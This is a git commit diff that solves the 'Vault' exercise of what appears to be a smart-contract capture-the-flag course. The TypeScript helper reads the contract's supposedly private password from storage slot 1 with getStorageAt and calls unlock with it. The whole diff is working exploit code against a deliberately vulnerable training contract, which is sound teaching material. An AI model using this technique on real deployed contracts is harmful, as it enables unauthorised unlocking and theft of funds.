9cd44072fda9ae47c7de518cb31fd99755b2666a
Rares Stanciu <rares.stanciu@outlook.com>
2022-05-04 22:24:24 +0300

    feat: solve Vault

--- contracts/4. Vault/VaultHelper.ts
+++ contracts/4. Vault/VaultHelper.ts
@@ -1,13 +1,24 @@
-import { expect } from "chai";
-import { ethers, waffle } from "hardhat";
+import { ethers } from "hardhat";
 
 const helper = async (victim: any) => {
-  /* 
-    Add code here that will help you pass the test
-    Note: Unlock without using the string "A very strong password"
-    Unlock the vault by somehow reading the private password from 
-    Vault directly
-  */
+  /*
+  We know that EVM stores state variables in 256 bit slots,
+  packing any adjacent variables that can fit together in the same slot.
+  That means we expect Vault's state variables to be stored as such:
+
+  bool public locked;       // Slot 0
+  bytes32 private password; // Slot 1
+ */
+  // We read the second slot
+  const hexPassword = await ethers.provider.getStorageAt(victim.address, 1);
+
+  // We convert from hex to UTF-8 encoded string (for confirmation)
+  const asciiPassword = ethers.utils.toUtf8String(hexPassword);
+  console.log(`Password is: ${asciiPassword}`);
+
+  // Attack
+  const tx = await victim.unlock(hexPassword);
+  await tx.wait();
 };
 
 export default helper;
